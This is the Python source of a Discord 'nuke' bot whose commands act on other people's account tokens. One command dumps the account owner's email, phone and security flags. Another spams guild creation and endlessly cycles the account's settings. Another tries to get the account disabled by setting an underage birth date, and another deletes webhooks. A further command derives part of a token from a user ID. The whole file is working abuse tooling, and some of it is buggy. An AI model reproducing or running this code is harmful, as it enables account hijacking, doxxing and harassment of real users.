#BOT CONFIG
token = "whatever token your bot is"
prefix = "whatever prefix you want"

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]



###############################################################################################################################
# WAIT!!! DON'T TOUCH ANYTHING BELOW UNLESS YOU KNOW EXACTLY WHAT YOU ARE DOING!!! THIS MAY CAUSE SOME ISSUES WITH THE BOT!!! #
###############################################################################################################################


import discord, random, aiohttp, asyncio, requests, sys, multiprocessing, os, itertools ,threading ,datetime ,datetime 
import subprocess, time, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, webbrowser, aiohttp, dns.name, asyncio, functools
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext import tasks
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
from discord.ext.commands import Bot
from itertools import cycle
from colorama import Fore
from sys import platform
from threading import Thread
from bs4 import BeautifulSoup as bs4



bot = commands.Bot(command_prefix = prefix, intents = discord.Intents.all())

@bot.event
async def on_ready():
  print(f"""
{S.BRIGHT}{C.LIGHTGREEN_EX}Easynuke is ready.{S.NORMAL}
This script is connected to {C.WHITE}{bot.user}.
{C.GREEN}Run {C.WHITE}{prefix}kill {C.GREEN}in any server to nuke it.
{C.GREEN}Run {C.WHITE}{prefix}cmds {C.GREEN}in any server with your bot to get a list of commands.

{C.WHITE}Your bot's oauth2 link is {C.LIGHTBLUE_EX}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot
""")
  
bot.remove_command("help")


@bot.command()
async def cmds(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "Red Not Sus - Commands", 
    description = """
**__COMMANDS__**
```
+cmds
Shows this message. 

+tokeninfo
gets info about given token

+tokenFuck
Nukes given token 

+tokenDisable
disables given token(im not 100% sure if it works)

+webhook
destroys give webhook
(wont say if it was invalid or not)

+id
You can get the first part of 
somebodys token with there 
id 

+invite
for the invite 
```
**__CREDITS__**
```
Made by Billy-eyelash13#8630 i made it from the corpse of this bot
https://github.com/Chatic-Gaming/DiscordNukebot
```
""")
  await author.send(embed = cmds)

@bot.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
    except KeyError:
        print("Invalid token")
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@bot.command()
async def webhook(self, url):
    requests.delete(self.webhook_url)

@bot.command(aliases=['bot', 'add'])
async def invite(ctx):
    await ctx.send('https://discord.com/oauth2/authorize?client_id=740672172388778005&permissions=8&scope=bot')

@bot.command()
async def tokenDisable(token21, ctx):
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token12}, json={'date_of_birth': '2020-7-16'})
    if r.status_code == 400:
        await ctx.send('Account disabled successfully')
    else:
        await ctx.send('that shit is invlaid')

@bot.command()
async def id(ctx, string): # b'\xfc'
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

        
@bot.command()
async def tokenfuck(ctx, _token): # b'\xfc' 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': 100,
        'icon': None,
        'name': "Fuck you",
        'region': "europe"
    } 
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break
                    
        

def Clear():
    os.system('cls')
Clear()

if __name__ == "__main__":
  print(f"""
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}   ▄████████    ▄████████    ▄████████ ▄██   ▄   ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███   ███    ███ ███   ██▄ ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▀    ███    ███   ███    █▀  ███▄▄▄███ ███   ███ ███    ███   ███▐██▀     ███    █▀  {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT} ▄███▄▄▄       ███    ███   ███        ▀▀▀▀▀▀███ ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}▀▀███▀▀▀     ▀███████████ ▀███████████ ▄██   ███ ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    █▄    ███    ███          ███ ███   ███ ███   ███ ███    ███   ███▐██▄     ███    █▄  {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ███    ███   ███    ███    ▄█    ███ ███   ███ ███   ███ ███    ███   ███ ▀███▄   ███    ███ {S.RESET_ALL}||
{S.RESET_ALL}||{C.LIGHTYELLOW_EX}{S.BRIGHT}  ██████████   ███    █▀   ▄████████▀   ▀█████▀   ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ {S.RESET_ALL}||

{S.RESET_ALL}                                       {C.BLACK}-Made by Chaotic-
                       {C.WHITE}https://github.com/Chatic-Gaming/DiscordNukebot
  """)
  try:
    bot.run(token)
  except discord.LoginFailure:
    print(f"{C.RED}Client failed to log in. {C.WHITE}[Improper Token Passed]")
  except discord.HTTPException:
    print(f"{C.RED}Client failed to log in. {C.WHITE}[Unknown Error]")
